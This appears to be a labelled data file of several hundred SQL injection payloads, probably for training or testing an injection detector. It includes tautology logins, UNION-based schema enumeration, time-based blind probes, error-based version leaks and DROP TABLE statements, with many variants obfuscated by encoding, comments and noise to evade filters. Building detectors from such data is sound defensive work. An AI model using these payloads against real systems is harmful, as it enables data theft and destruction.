"1))/**/UNION%20SELECT/**/1%2cdat%61base(%29,3--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A%20OR%20%281%29", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29%u0020--%u0020random_noise--", 1
"WAITFOR%20DELAY%20'0:0:5'--", 1
"' AND 1=convert(int,@@version)----44x7nlfawn13s", 1
"WAITFOR    DELAY    '0:0:5' -- random_noise--", 1
"1%2%39%29%20UN/*!*/ION%2%30SELECT%201%2%43datab%61s%65%28%29%2C3--", 1
"test' OR '1'='1' -- --610lty94wmonq2", 1
"'%20OR%20EXISTS(SELECT%201%20FROM%20users)--", 1
"admin'/**/OR/**/'1'='1#rri68c4ia878h", 1
"; DRop taBLE UseRS; --", 1
"1'%09%09o/*!12345*/r%09%09iF(suBstriNG(dATABasE(),%09%091,%09%091)	=%20'A',%09%09SLEEP(5),%09%090)%09%09--", 1
"'/**/ANd%2f**/1<%3dconvERT(in%54,@@VeRS%49oN)--", 1
"1'/**/O%52/**/ascii(%73ubstring(%64ataba%73e(),/**/1,/**/1))/**/%3e/**/100/**/ -- random_noise--", 1
"'UNIONSELECTnull,null,null#more_noise--/*%0a*/%0d%0a", 1
"; DROP TA%42%4cE use%72s; --", 1
"'OR/*%0d%0a*/1=1/*%0d%0a*/--", 1
";DROPTABLEusers;/*%0d%0a*/--", 1
"", 1
"1%2520%26%26%2520%281%253D1%291%253D1 # more_noise", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)%3D%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"1%29%20UNIoN%20seleCt%201%2CdATABasE%28%29%2c3 OR 'b'='b'--", 1
"tEst%27%20or%20%271%27%3D%271%27%20--%20", 1
"%u0027/*!12345*/AND%u00201>=1%u0020--%u0020", 1
"1%U0020AnD%u00201=1", 1
";/*!*/DROP TABLE users;  /*!*/AND 1=1--", 1
"%3B%20drO%2570%20tabLE%2520%2575SeRS%3B%20--", 1
";%u0020DR%4fP%u0020TABLE%u0020u%73e%72s;%u0020---%2d4q2myk", 1
"test'/**/OR/**/'1'='1'/**//**/AND/**/'a'='a'--/**/", 1
"'UNION%0d%0aSE%4cEC%54%201,2,3 /*!*/AND 1=1--", 1
"' anD 1>=ConVERt(InT,@@VERSIoN)--#FdWXBIRo0vy", 1
"1))UNION/*%0a*/SELECT1,database(),3 OR 'b'='b'--", 1
"1%27%2F%2A%2A%2FUNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20 # more_noise--", 1
"%u0027%u0020AND%u00201=1%u0020%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--%u0020", 1
"'/*!12345*/UNION SELECT 1,2,3----z3w339u3vh3", 1
"%u0027%u0020O/*!*/R%u00201LIKE1%u0020--%u0020", 1
"test'OR'1'='1'/*%0d%0a*/--/*%0d%0a*/", 1
"1%u0020A%4eD%%7500201=1", 1
"1 AnD 1=1", 1
"admin%27%2F%2A%2112345%2A%2FOR%20%20%20%20%20%20%271%27%2509%3D%2509%271 OR (1)", 1
"TESt' OR '1'='1' /*", 1
";/*!12345*/SELECT  pg_sleep(5);   OR (1)--#iuvww", 1
"admin'%20OR '1%27='1", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#kt7llu", 1
"' OR 1=1 -- #nrc2qott0qgw5u", 1
"test%27%20OR%20%271%27%3D%271%27%20%20%2F%2A%21%2A%2FAND%201%3D1--%20", 1
"1AND1%3D1%250d%250a", 1
"admin%27%2F%2A%21%2A%2FOR%20%271%27%3D%271", 1
"'%20%20%20%20AND%20%20%20%201  = convert(int,@@version)--#x78g6", 1
"1))/*!*/UNION%20%20%20%20%20SELECT%20%20%20%20%201,database(),3--#jtn8q4vxvu40e", 1
"1'			UNION			SELECT			table_name,			null,			null			FROM			information_schema.tables			----l9m89", 1
"1))%20%20%20%20UNION%20%20%20%20SELECT%20%20%20%201,database(),3--", 1
"1)) UnioN selEcT 1,%64%61%74%61bASE(),3--", 1
"%u0027%u0020%u0020%u0020Or%u0020%u0020%u0020eXISTS(SelecT%u0020%u0020%u00201%u0020%u0020%u0020froM%u0020%u0020%u0020USerS)--", 1
"1)/**/uniON/**/SeLeCt/**/1,dataBase(),3--", 1
"%27%20AND%20extractval%2575e%281%2Cconc%2561t%280x5c%2Cv%2565r%2573ion%28%29%29%29----3y%2574en8%2538by", 1
"; DrOP tAblE USeRS; --", 1
"' And 1=1 -%2d%20", 1
"1%u0027/*!12345*/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)OR/*%0d%0a*/'b'='b'--%0d%0a", 1
"test%27%20O/*!12345*/R%20%271%27%3D%271%27%20 # more_noise--%20", 1
"%27%20ANd%201%3DCoNvert(INt,@@veRSIOn) # More_NoISe--", 1
"%27%20OR%20EXISTS%28SELECT%201%20%46ROM%20users%29%20%7c| %281=%31)(1)-%2d", 1
"%27%20A/%2a%21*/N%44%201%3D%63onv%65rt(int,@@version)--", 1
"%3B%2F%2A%2112345%2A%2FseleCt%20pG_sLeEp%285%29%3B%20--", 1
"' AND %31=1%20--", 1
"' UNION SELECT null, null, null -- --z4u7dnd", 1
"ad%6d%69n'/**/OR/**/'%31'='1", 1
"'/**/   UNION    SELECT    1,2,3--", 1
"WAITFO/*!12345*/RDELAY%%30d%0a'%30:0:5'-%2d", 1
"", 1
"'OR", 1
"'1'IN/*%0a*/(1)'1%0a", 1
";					SELECT					pg_sleep(5);					--", 1
"1%27%20O/**/R%20ascii(substring(database(),%201,%201))%20%3E%20100%20 OR 'b'='b'--", 1
"'UNION%0d%0aSELECT/*%0d%0a*/1,2,3--%0d%0a", 1
"ADMIN'%20 or  '%31%27%09=	'1", 1
"'%20%41ND extractvalue(1,concat(0x5%63,%76ersion()))%2d---%6a4z31%618i43d56u", 1
"'/*!*/AND 1>=convert(int,@@version)--#h9guxv", 1
"1) UNION SELECT 1,database(),3--#79as4phivsj3", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20 -- random_noise--", 1
"1'ORascii(substring(database(),", 1
"1,1))>100", 1
"--#3geddjn7z", 1
"WAITFO%52%20DELAY%20%2%370:%30:5%27--", 1
"%3b/**/%44ROP/**/TABLE/**/us%65%72s;/**/--#kvb4%63z6mw6b39i", 1
"%27%2509%2509OR%2509%2509EXISTS%28SELECT%2509%25091%2509%2509FROM%2509%2509users%29--", 1
"admin' || '1'IN (1)'1", 1
"'/*!*/OR 1<=1 --", 1
"1' AND subst%72%69ng(database(),%201, 1)%20= 's' %2d-", 1
"1'/*!*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020 -- random_noise----c82b5", 1
"1%27%20UN/**/ION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--", 1
"'%09%09AND%09%09extractvalue(1,concat(0x5c,version()))--", 1
"1))%U0020UnioN%u0020sELECt%u00201,dATaBASE(),3--", 1
"1))/**%2fUnio%6e/**/SE%6cEct/**/1,DaTA%62AsE%28),3--", 1
"%27OR/*%0d%0a*/1%3E%3D1/*%0a*/--%0d%0a--7p6eg9n66irw", 1
"tESt'/*!12345*/OR %271'='1' %2F*#w4hNzOib50YQwwN", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#l03d0hh3rhq", 1
"'/**/OR/**/'1'='1/**/AND/**/'a'='a'", 1
"1'  UNION  SELECT  table_name,  null,  null  FROM  information_schema.tables  --", 1
"%2527%2520OR%2520%25271%2527%253D%25271%2520AND%2520%2527a%2527%253D%2527a%2527", 1
"1AND/*%0a*/1=1%0a OR 'b'='b'", 1
"1' Or ASCii(SUbstRIng(daTABASE(), 1, 1)) > 100 --", 1
"'	oR	ExiSts(SElECt	1	fROm	USERS)--#j7rnbyblf986", 1
"' || 1=1 -- --mfec47v5ahu", 1
"1%27%2520%2520%2520%2520UNION%2520%2520%2520%2520SELECT%2520%2520%2520%2520table_name%2C%2520%2520%2520%2520null%2C%2520%2520%2520%2520null%2520%2520%2520%2520FROM%2520%2520%2520%2520information_schema.tables%2520%2520%2520%2520--%23o7i3qfpo659w", 1
"TeSt' or '1'='1' -- #6hv1h7p16eusjk", 1
"1%27%20UNIon%20SelEct%20TAbLe_namE%2C%20nuLL%2C%20nUlL%20fROM%20InfOrMaTioN_scHema.tables%20--", 1
"1%29%29%2520UnIon%2520seLecT%25201%2CdaTabASE%28%29%2C3%2520Or%2520%27b%27%09%3D%2509%27B%27--", 1
"%U0027OR%0d%0aexisTS(SeleCt1froM/*%0D%0A*/USers)--", 1
"'/**/AND/**/1=1/**/--/**/--q2xqb54vkvu", 1
"'%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%20null,%20%20%20%20%20null,%20%20%20%20%20null%20%20%20%20%20%20%20%20%20%20/*!*/AND%20%20%20%20%201  =  1--%20%20%20%20%20", 1
"adMiN'/**/O/*!*/R/**/'1'<='1", 1
"1'%09%09OR%09%09IF(substring(database(),%09%091,%09%091)%20=	'a',%09%09SLEEP(5),%09%090)%09%09--", 1
"admin' OR '1'='1 # more_noise", 1
"'/*!*/OR 1=1  /*!*/AND 1=1--", 1
"1'				UNION				SELECT				table_name,				null,				null				FROM				information_schema.tables				--", 1
"admin%27/*!*/||%20%271%27%3D%271", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----i9n7ssgy0", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))%20--%20random_noise--", 1
"%u0027%u0020UN/*!*/ION%u0020SELECT%u00201,2,3--", 1
"1'        OR        IF(substring(database(),        1,        1)> =	'a',        SLEEP(5),        0)        --", 1
"'aND%0d%0aexTracTvAlUE(1,cOncAT(0X5C,vErSiON()))--/*%0d%0a*/", 1
"1'OR%0d%0aascii(substring(database(),1,1))%0a>100#more_noise--#vbhnrc1kgqh1", 1
"1%U0027%U0020aND%U0020subsTRInG(daTabAse(),%u00201,%u00201)%U0020=%u0020%U0027s%U0027%U0020--", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020--#v7l8joaltvj6", 1
"1'/*%2112345*/ORIF(subs%74ring(data%62ase(),%201,1%29='a'%2cSLEEP(5),/*%0d%0a*/0)-%2d/*%0a*/", 1
"; SelecT pg_sLeEp(5); --", 1
"1'/*!12345*/or AsCII(SUbString(dAtAbasE(), 1, 1)) > 100 ----2aj58h4", 1
";/**/DROP/%2a*/TABLE/**/use%72s;/%2a*%2f--", 1
"1) UNION SELECT 1,database(),3 # more_noise--", 1
"adMiN' OR '1'='1", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20 AND 'a'='a'--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020----zh90p2erovwwv3", 1
"'/**/AND 1IN (1)1  AND 'a'='a'--", 1
"1) UNION SELECT 1,database(),3 OR 'b'='b'--", 1
"1   AND   1%3d1", 1
"WAITFORDELAY%250d%250a%270%3A0%3A5%27--%2F%2A%250a%2A%2F", 1
"1%2527%2520AND%2520substring%%328database%28%2%39%2%43%25201%2C%25%3201%%329%2520%253D%2520%%32%3527s%252%37%%32520--", 1
"WAI%54F%4fR%20%2%30DELAY%20%20%270:0:%35%27--", 1
"' or '1'LIKE'1#Ao7kuufO5", 1
"TEST%27%20Or%20%271%27%3d%271%27%20/*--k38e111eEvp8H7", 1
"test' OR '1'='1'  AND 'a'='a'--", 1
"1'%4fR%49F(substr%69ng(database%28%29,1,%0d%0a1)='a',SLEEP(5%29,/*%0d%%30a*/0)--", 1
"", 1
"1)%U0020un/*!*/iOn%u0020sELecT%U00201,dATAbaSE(),3--", 1
"1) uniON SeleCT 1,dAtAbase(),3 # MoRe_NOisE----0aCXWm1V", 1
"1/**/&&/**/1=1 # mOre_nOIse", 1
"adm%69n%27 OR '1'='1", 1
"%27/**/AND%201%3Dconvert(int,@@version)%20&&%20(1%3D1)%27a%27%3D%27a%27--", 1
"' && (1=1)1=convert(int,@@version)--", 1
"%u0027%u0020O/**/R%u00201=1%u0020--%u0020", 1
"'AND", 1
"extractvalue(1,concat(0x5c,version()))--%0d%0a", 1
"'/*!12345*/oR1=1%0D%0a /*!*/AND 1=1--%0a", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--#hxksb", 1
"%27%2F%2A%2A%2FAnd%201%3DCOnvERT%28INt%2C%40%40VeRsiON%29--", 1
"'%20%20%20AND%20%20%20extractvalue(1,concat(0x5c,version()))--", 1
"%27%2F%2A%2112345%2A%2FAND%201%3Dconvert%28int%2C%40%40version%29--", 1
"%u0027/**/%4fR/**/%u%300%3271%u0027%3d%u00271", 1
"'OR1=1%0d%0a--#ioa7z", 1
"'AnD/*%0d%0a*/1LIKEcONvERT(int,@@VerSIoN)--", 1
"1%27%20OR%20if%28suBsTRING%28DatabaSE%28%29%2C%201%2C%201%29%3D%27A%27%2C%20SLEeP%285%29%2C%200%29%20--", 1
"' oR 1<=1 --", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)--#tie2z0ra", 1
"%27/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/--860zbt7upyf", 1
"%%325u0%3027%25%750020OR%25u00201%3D1%25u%30020--%25u00%320", 1
"%2527%2%3520OR%25%3201%2%353D1%2520--%252%30", 1
"'/*!12345*/AND 1=convert(int,@@version) OR (1)--", 1
"wAItfor%2520dELAY%2520%25270%3A0%3A5%2527--", 1
"TEst%u0027%u0020oR%u0020%u00271%u0027=%u00271%u0027%u0020/*#wyn9qmv", 1
"1%09%09AND%09%091%20=%201", 1
"%27%20AND%201%3E%3D1%20 -- random_noise--%20#6ndpg9pug4lnep", 1
"' OR '1'='1--4hflgwlhl2vmorz", 1
";				SELECT				pg_sleep(5);				--", 1
"admin'/**//**/OR/**//**/'1'%09=/**/'1", 1
"'/**/&& (1=1)1=1 --", 1
"%27%20UN%2549ON%20SELECT%2520nu%256cl%2C%20null%252c%20null%20%20--%20random_noise--%20", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/ AND 'a'>='a'--", 1
"admin%25u0027%2F%2A%2A%2FOR%2F%2A%2A%2F%25u00271%25u0027%20%3D%09%25u00271", 1
"1%29%29UNION%2F%2A%250a%2A%2FSELECT1%2Cdatabase%28%29%2C3--%2F%2A%250a%2A%2F--xyy9pc", 1
"%2527%2520XOr%25201%253d1%2520--%2520", 1
"1'Or/*%0a*/asCIi(sUbsTriNg(DatabAsE(),1,1))>100--", 1
"%U0027%u0020aNd%U00201%20=%20cONveRt(int,@@versIoN)--", 1
"1'XORsUBStrinG(dATaBAse(),%0A1,1)/*%0a*/=%09'S'--", 1
"TEst'%09%09%09%09oR%09%09%09%09'1'%20IN (1)%20'1'%09%09%09%09--%09%09%09%09--vw2Z7nc3x", 1
"'/*!*/OR%09%09%09%09'1%27%3d'1", 1
"%3B%20DROP%20%2554%2541BLE%2520users%3B%20--", 1
"1)) UNION SELECT 1,database(),3----sf28fintdzgv1s", 1
";DRO%50TABL%45%0ause%72s;--/*%0d%0a*/", 1
"%27OR1%3D1%2F%2A%250a%2A%2F--", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/* OR 'b'='b'", 1
"1)%u0020uNiOn%u0020SeLect%u00201,DAtAbaSE(),3--", 1
"1)%u0020UnioN%U0020sElEct%U00201,dATABasE(),3--", 1
"tEST%27%20OR%20%271%27%3d%271%27%20/*", 1
"admin%27%20OR%20%271%27%3D%271%09%09OR%09%09(1)", 1
"'/**/UNION/**/SELECT/**/1,2,3/**/#/**/more_noise--", 1
"admin%27%20OR%20%271%%327%3D%%327%31--pavtllbz9", 1
"test%2%37%%320%4fR%20%271%27%3D%271%27%20--%2%30", 1
"'				UNION				SELECT				null,				null,				null				--				--81fnoz8fidvmt", 1
"%u0027%u0020||%u0020(1=1)1=1%u0020--%u0020", 1
"1%27/*!12345*/AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  OR (1)----95lnivlwt0tu", 1
"test%27%09%09O/*!12345*/R%09%09%271%27%20%3D	%271%27%09%09--%09%09", 1
"'UNIONSELECTnull,null,/*%0a*/null--", 1
"' OR 1=1 -- #a3c4i465e6acd", 1
"'%09%09OR%09%09'1'%20=%20'1", 1
"'/*!123%345*/O%52 '1'=%271 AND 'a'='a'", 1
"1%u0027/*!12345*/UNION%u0020%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u0020%u0020table_name,%u0020%u0020%u0020%u0020%u0020null,%u0020%u0020%u0020%u0020%u0020null%u0020%u0020%u0020%u0020%u0020FROM%u0020%u0020%u0020%u0020%u0020information_schema.tables%u0020%u0020%u0020%u0020%u0020----oviknletnf7h1x", 1
"' OR 1%09= 1 --", 1
"TEst' oR '1'='1' --", 1
"' %20   OR     EXISTS%28SELE%43T     1    %20%46ROM     us%65rs) /*!*/AND 1=1--", 1
"1))UNION/*%0a*/SELECT", 1
"1,database(),3--", 1
"", 1
"' |%7c '1'=%271", 1
"1%27%20%20%20%20AND%20%20%20%20substr%69ng(database(),%20%20%20%201,%201)%20%20%20%20%3d%20%u0027s%u0027%20%20%20%20--", 1
"' aND eXTRACTVALue(1,conCAt(0X5c,veRsion())) # moRE_NOISE--", 1
"' XOR 1>=1 --", 1
"test%27OR/*%0a*/%271%27%3D%271%27/*%0a*//*", 1
"test%27%20OR%20%271%27%3D%271%27%20/*%20OR%20(1)", 1
"1'UNIONSELECT/*%0a*/table_n%61%6de,null,nullFROMinforma%74ion%5fschema.t%61bl%65%73%20OR(1)--", 1
"teSt' oR '1'='1'  OR (1)--", 1
"tEST' Or '1'='1' --", 1
"%u0027%09%09%09%09%09UN/*!*/ION%09%09%09%09%09SELECT%09%09%09%09%091,2,3--", 1
"%27OR%0a1%3D1", 1
"AND 'a'='a'--/*%0d%0a*/", 1
"admin' OR '1'='1 -- random_noise", 1
"'/*!*/OR/**/'1'='1", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#gb7yol368", 1
"WAITFOR/*!*/DELAY%u0020%u00270:0:5%u0027--", 1
"admin%27%20OR%20%271%27%3D%271%20%2F%2A%21%2A%2FAND%201%3D1", 1
"1)/*!*/UNION%20SELECT%201,database(),3----2wsdj122fzm54", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020--#wlfha35tw", 1
"1%27%20AnD%20suBSTRing(databASE(),%201,%201)%20%3D%20%27S%27%20--", 1
"1%u0027O/**/RIF(substring(database(),1,%0d%0a1)=%u0027a%u0027,SLEEP(5),0)----dsnzsh", 1
"%u0027%u0020OR%u00201  = 1%u0020--%u0020", 1
"1)/**/UNION/**/SELECT/**/1,database(),3 -- random_noise--", 1
";/**/DROP/**/TABLE/**/users;/**/ AND 'a'='a'----97na2u4n5q0", 1
"%27AND%2F%2A%250d%250a%2A%2Fextractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--%2F%2A%250a%2A%2F--2lqyki0a1hl3", 1
"test'%09%09OR%09%09'1'%09=/*!*/'1'%09%09/*", 1
"admin%27%%32%30%7c|%20%271%27%3D%271", 1
"1%27%20and%20%73UBSTrINg(DaTA%62AsE(),%20%31,%201)%20%3d%20%27s%27%20--", 1
"'			U%4eION			SEL%45CT			1,2,%33--", 1
"1'/*!12345*/uNionsEleCtTAblE_naME,/*%0A*/nulL,NUllfROmINFoRMatioN_schemA.TabLEs%0D%0A--", 1
"'/*!*/AND1=convert(int,@@version) -- random_noise--/*%0a*/", 1
"%27%20%20%20%20AND%20%20%20%201%20%20%3D	convert(int,@@version)%20AND%20%27a%27%3D%27a%27--", 1
"test%u0027%u0020OR%u0020%u00271%u0027 =	%u00271%u0027%u0020--%u0020", 1
"1' OR IF(substring(database(), 1, 1)%20= 'a', SLEEP(5), 0) --", 1
"' AND%20extractvalue(1,concat(0x%35c,ve%72sion%28)))-%2d /*!*/AND 1=1#xgchv6k16pk", 1
"%3BSELECT%2F%2A%250d%250a%2A%2Fpg_sleep%285%29%3B--", 1
"1%20%26%26%20%281%3D1%291%3D1--rcq21jdtis1yg", 1
"WAITFOR%u0020%44EL%41Y%u0020%u00270:0:%35%u0027--", 1
"1'/**/ XOR  Ascii(subSTring(dAtabaSE(),  1,  1))  >  100  --", 1
"WAITFOR          DELAY          '0:0:5'--", 1
"' or '1'='1 # mORE_noiSE", 1
"'%%309And%091	>=%091%09-%2d%0%39", 1
"'/*%0d%0a*/AND/*%0d%0a*/1=%0aconvert(int,@@version) -- random_noise--", 1
"admin%27OR%250d%250a%271%27%3D%271%250a%20%23%20more_noise", 1
"aDMIN'/**/oR '1'='1", 1
"test'/*!12345*/OR '1'='1'  OR (1)--", 1
"1%29%25u0020UN%2F%2A%21%2A%2FION%25u0020SELECT%25u00201%2Cdatabase%28%29%2C3----xtmfprob23c9", 1
"1' AND substring(database(), 1, 1) = 's' ----aikuellkigc8z", 1
";%20DrOP%20TABLe%20Users;%20--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20%20%23%20more_noise--#1ryv5", 1
";DROP%0d%0atABlEuSErs;--", 1
"1))%09UNION%09SELECT%091,database(),3--", 1
"' %4fR 1=1 --%20--m%655b6g", 1
"'/*!12345*/AND/**/eXtRactvALUE(1,cOnCat(0X5c,vERsIoN()))--", 1
"1))/*!12345*/         uniOn          SeleCT          1,DatAbAse(),3--", 1
"1))/**/UNION/**/SELECT/**/1,database(),3%20OR%20(1)--", 1
"' && 1=1  aND 'A'='A'--", 1
"'UNION%0aSELECTnull,null,%0anull--%0d%0a", 1
"test'/**/OR/**/'1'=%271%27/**//*", 1
"%u0027%u0020O%52%u00201=1%u0020--%20", 1
"1'%20%20%20%20OR%20%20%20%20IF(substring(database(),%20%20%20%201,%20%20%20%201)%20=  'a',%20%20%20%20SLEEP(5),%20%20%20%200)%20%20%20%20----rnghig22ggm8n0i", 1
"teST'or", 1
"'1'='1'%0D%0a/*%0d%0A", 1
"teST%U0027%u0020XoR%U0020%U00271%U0027=%U00271%U0027%u0020/* # mOrE_noISE", 1
"test'%09%%309%09%09OR%%309%09%09%09'1' =	%271'%09%09%0%39%0%39%2d-%09%09%09%09 /*!*/AND 1=1", 1
"1/**%2fAND/**/%31=1", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020----nyo1ql1zcqr7t", 1
"test%u0027%u0020%u0020%u0020OR%u0020%u0020%u0020%u00271%u0027%u0020=%u0020%u00271%u0027%u0020%u0020%u0020/*", 1
"WAITFOR DELAY '0:0:5'--#padggpl", 1
"'		oR		exIsTS(SELeCT		1		FrOM		USeRS)--#GL5d8", 1
"' OR '1'='1#k4hw42yaectpl", 1
"test%25u0027%25%750020OR%25u0020%2%35u00271%25u0027%3%44%25u00271%25u%30%30%327%25u002%30%%32F%2A AND 'a'='a'", 1
"1'ANDsubstring(database(),1,1)='s'--/*%0d%0a*/", 1
"test%27%254fR%271%27%3D%271%2527%250a%2F%2A", 1
"'%20%20%20%20OR%20%20%20%20'1'%09=  '1", 1
"1' A%4eD substring(%64ataba%73e(),%201, 1) = 's' --#g8%772j", 1
"%27%20UNIo%4E%20SEleCt%20NuLL,%20n%75LL%2c%20nULL%20--%20", 1
"' OR EXISTS%28%53ELECT 1 FR%4f%4d users)--", 1
"'		OR		'1'  =%20'1", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020%u0020OR%u0020%u0027b%u0027LIKE%u0027b%u0027--", 1
"1) UNION SELECT 1,database(),3 /*!*/AND 1=1----zjcwim", 1
"test%27%20OR%20%271%27%3D%271%27%20%20OR%20%281%29--%20", 1
"1%u0027%u0020AND%20substring(datab%61se(%29,%u00201,%201)%u0020  =	%u0020%u0027s%27%u0020----jotnk2", 1
"adMIN' oR '1'LikE'1", 1
"W%41%49T%46ORDELAY%0d%0a'0:0:5'--", 1
"' UnIOn sELEct NuLl, NUlL, NUlL --", 1
"%74est' O%52 '1'>='1' /*", 1
"%u0027%u0020Union%u0020sELECt%u00201,2,3%u0020Or%u0020(1)--", 1
"1%20And%201%3D1 AND 'a'='a'", 1
";/*!*/SELECT			pg_sleep(5);						OR			%27b%27%09%3D%20%27b%27--", 1
"1AND/*%0d%0a*/1=1/*%0a*/--jp0n6aesbog", 1
"1%27%20OR%20aSCii%28substrINg%28DAtaBASe%28%29%2C%201%2c%201%29%29%20%3e%20100%20--", 1
";se%4CE%43t/*%0a*/pG_s%6cEEp(5);--", 1
"' unION SELeCT 1,2,3--", 1
"1)%20UNIoN%20SelECt%201,DATAbasE(),3--", 1
"1%29 U%4EioN seLecT 1,DAt%61bas%65(),3--", 1
"'/**/UNION/**/SELECT/**/1,2,3----oozz461n50cr0", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020/*!*/AND%0a1=1--%u0020%0d%0a", 1
"1%U0027/*!12345*/or%U0020IF(subStRING(daTABase(),%U00201,%U00201)=%U0027A%u0027,%u0020SlEep(5),%u00200)%u0020--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#rj1f0", 1
";%20SELECT%20pg_sleep(5);%20 OR 'b'='b'--", 1
"'UNIONSELECTnull,%0anull,null", 1
"--random_noise--/*%0a*/", 1
"%27%20%20%20%20AND%20%20%20%201%2509%3D%20convert%28int%2C%40%40version%29----bv7bcsk2hm1c5gk", 1
"'/*!*/AND/**/extractvalue(1%2cconcat(%30x5c,ver%73ion()))%2d%2d", 1
";%20sEleCT%20Pg_sLEeP(5);%20 # more_noise--", 1
"wAiTFOr%20deLAY%20%270:0:5%27--#r1vjx8e6p", 1
"%27%20UNION%20SELECT%201,2,3%20--%20random_noise--", 1
"tEst'%09%09%09%09%09Or%09%09%0%39%09%0%39'1'	=%0%39'1%27%%309%%309%09%09%09/* -- rando%6d_noise", 1
"' UNION %53EL%45CT 1,2,%33--", 1
"%27%20AN%44%201%3D1%20%2d-%20", 1
"ADMiN%27%2520o%2572%20%20%20%20%20%271%27%2520%3D%20%271", 1
"adMIn'          O%52          '1'%20=%09%271", 1
"%27/**/OR/**/1=1/**/%2d-/**/#xx5l5ozm3%65bd0", 1
"%27%20UNiOn%20seLEct%201%2C2%2C3%20OR%20%281%29--", 1
"' AND 1IN (1)convert(int,@@version) AND 'a'='a'--", 1
"'/**/uniON/**/SeleCT/**/1,2,3/**/#/**/More_NoIsE--", 1
"1))			UNION			SELECT			1,database(),3%20OR%20%27b%27%3D%27b%27--", 1
"%74est%27/*!12345*/%20%20%20%20%20OR%20%20%20%20%20%20%271%27%20%20%3D%20%20%271%27%20%20%20%20%20%20--%20%20%20%20%20%20", 1
"'&&/*%0a*/(1=1)1=convert(int,@@version)----2kaqqdqqqhqhr", 1
"WAITFOR%2520DELAY%2520%25270%3A0%3A5%2527%20OR%20%281%29--", 1
"1)%u0020UNIOn%u0020seLECT%u00201,DATaBasE(),3--", 1
";DROP%0aTABLE%0ausers;%0a--", 1
"wAitFor/**/delay%20%270:0:5%27--", 1
"%27AND/*%0a*/1	%3D%20convert(int,@@version)%09%09%09OR%09%09%09%27b%27	%3D%20%27b%27--%0d%0a", 1
"test'OR'1'='1'/*%0d%0a*/--/*%0a*/", 1
"WAIT%46OR/**/%44%45LAY/**/'0:0:5'--", 1
"%31A/*!1%32345*/%4eD", 1
"1=1%0a", 1
"'  AND  1%20<=  convert(int,@@version) -- random_noise----gp06dbggqosv", 1
";%09%09%09%09%09DROP%09%09%09%09%09TABLE%09%09%09%09%09users;%09%09%09%09%09--", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version()))--#cr0ssjr", 1
";%09%09SELECT%09%09pg%5fsl%65e%70(5);%09%09%09%09/*!*/AND%09%09%31	=  1--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----vof3sa", 1
"TeSt'OR'1'='1'/*%0A*//*", 1
";%20DRO%50%20TABLE%20use%72s%3b%20 AND 'a'='a'--", 1
"%27%20%4f%52%2%30E%58ISTS(SELECT%201%20FROM%20%75sers) AND 'a'='a'--", 1
"1))/**/UNIon/**/selEcT/**/1,DaTAbasE(),3--", 1
"%27%2F%2A%2112345%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29--", 1
"1))UNION", 1
"SELECT1,database(),3 # more_noise--/*%0d%0a*/", 1
"1' OR ascii%28substring(database(%29, 1, 1)) >%201%300 -%2d", 1
"1%u0027%u0020&&%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20%20AND%20%27a%27%3D%27a%27--", 1
"adMiN'Or", 1
"'1'='1%0a", 1
"%27%20ANd%201%3dcoNVerT(inT,@@VErSiOn)--", 1
"ADmIN' Or '1'='1", 1
"1%27/*!12345*/AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20 AND 'a'='a'--", 1
"test%u0027%u0020OR%u0020%u00271%u0027>=%u00271%u0027%u0020--%u0020--yunshvtooo8k", 1
"1'ORIF(substring(database(),/*%0a*/1,%0a1)='a',SLEEP(5),", 1
"0)--", 1
"%27		OR		1/%2a*%2f%20%3D%201		%2d-", 1
"%27/**/AND/**/1%09=%201%20--/**/", 1
"1%29%20UNIoN%20sElect%201%2cdATABAsE%28%29%2c3--", 1
